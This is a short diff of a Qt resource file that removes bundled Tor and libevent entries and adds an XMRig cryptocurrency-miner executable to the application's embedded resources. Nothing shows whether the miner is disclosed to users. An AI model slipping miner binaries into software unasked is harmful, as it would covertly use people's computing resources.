@@ -1,6 +1,5 @@
 <!DOCTYPE RCC><RCC version="1.0">
     <qresource prefix="/">
-        <file>tor/tor</file>
-        <file>tor/libevent-2.1.7.dylib</file>
+        <file>assets/exec/xmrig</file>
     </qresource>
 </RCC>
